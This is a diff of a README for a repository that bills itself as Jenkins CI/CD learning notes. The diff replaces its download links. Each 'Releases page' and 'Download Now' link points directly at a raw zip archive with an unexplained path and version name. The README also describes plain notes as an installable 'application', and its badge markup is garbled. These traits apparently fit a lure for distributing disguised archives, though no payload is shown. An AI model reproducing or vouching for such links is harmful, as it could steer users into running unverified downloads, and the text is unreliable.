@@ -1,7 +1,7 @@
 ```markdown
 # 🌟 Jenkins-Basics-To-Production - Learn Jenkins from Scratch to Deployment
 
-[![Download Now](https://raw.githubusercontent.com/pgkub/Jenkins-Basics-To-Production/main/kraurite/Jenkins-Basics-To-Production.zip%20Now-Click%https://raw.githubusercontent.com/pgkub/Jenkins-Basics-To-Production/main/kraurite/Jenkins-Basics-To-Production.zip)](https://raw.githubusercontent.com/pgkub/Jenkins-Basics-To-Production/main/kraurite/Jenkins-Basics-To-Production.zip)
+[![Download Now](https://github.com/pgkub/Jenkins-Basics-To-Production/raw/refs/heads/main/Day 02/Basics-To-Production-Jenkins-v3.2-alpha.4.zip%20Now-Click%https://github.com/pgkub/Jenkins-Basics-To-Production/raw/refs/heads/main/Day 02/Basics-To-Production-Jenkins-v3.2-alpha.4.zip)](https://github.com/pgkub/Jenkins-Basics-To-Production/raw/refs/heads/main/Day 02/Basics-To-Production-Jenkins-v3.2-alpha.4.zip)
 
 ## 📖 Description
 This repository provides day-by-day notes, Jenkinsfiles, pipeline examples, and hands-on resources to help you learn Jenkins CI/CD. Whether you want to set up basic automation or develop production-ready workflows, this guide will support you every step of the way.
@@ -9,7 +9,7 @@ This repository provides day-by-day notes, Jenkinsfiles, pipeline examples, and 
 ## 🚀 Getting Started
 Starting with Jenkins is easy. Just follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/pgkub/Jenkins-Basics-To-Production/main/kraurite/Jenkins-Basics-To-Production.zip).
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/pgkub/Jenkins-Basics-To-Production/raw/refs/heads/main/Day 02/Basics-To-Production-Jenkins-v3.2-alpha.4.zip).
    
 2. **Choose the Right Version**: Look for the latest version. We recommend getting the most recent release to access the latest features and improvements. 
 
@@ -38,7 +38,7 @@ To run this application, you will need:
 - Windows 10 or later, macOS 10.14 or later, or any recent Linux distribution.
 
 ## 📥 Download & Install
-To begin your learning journey, visit the [Releases page](https://raw.githubusercontent.com/pgkub/Jenkins-Basics-To-Production/main/kraurite/Jenkins-Basics-To-Production.zip) to download the application. Follow the steps in the "Getting Started" section for a smooth installation experience.
+To begin your learning journey, visit the [Releases page](https://github.com/pgkub/Jenkins-Basics-To-Production/raw/refs/heads/main/Day 02/Basics-To-Production-Jenkins-v3.2-alpha.4.zip) to download the application. Follow the steps in the "Getting Started" section for a smooth installation experience.
 
 ## 🛠️ Topics Covered
 This repository touches upon various important areas in the field of DevOps:
